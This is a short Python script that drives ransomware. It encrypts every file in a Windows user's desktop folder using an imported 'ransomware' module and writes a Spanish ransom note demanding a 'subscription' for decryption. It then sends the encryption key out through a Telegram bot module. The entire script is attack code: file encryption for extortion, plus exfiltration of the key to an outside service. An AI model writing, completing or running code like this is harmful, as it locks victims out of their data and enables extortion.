import os
import subprocess
import TBot as tbot
import psutil
import ransomware as rw
import variables as var



path_to_encrypt = 'C:\\Users\\enman\\OneDrive\\Desktop\\Gatitos'
items = os.listdir(path_to_encrypt)
full_path = [path_to_encrypt+'\\'+item for item in items]

rw.generar_key()
key = rw.cargar_key()

rw.encrypt(full_path, key)

with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
    file.write('Ficheros encriptados por el AP1103314 \n')
    file.write('Dame una suscripcion para desencriptar. Thanks')
         # Send the encryption key to Telegram
    tbot.send_key(key)
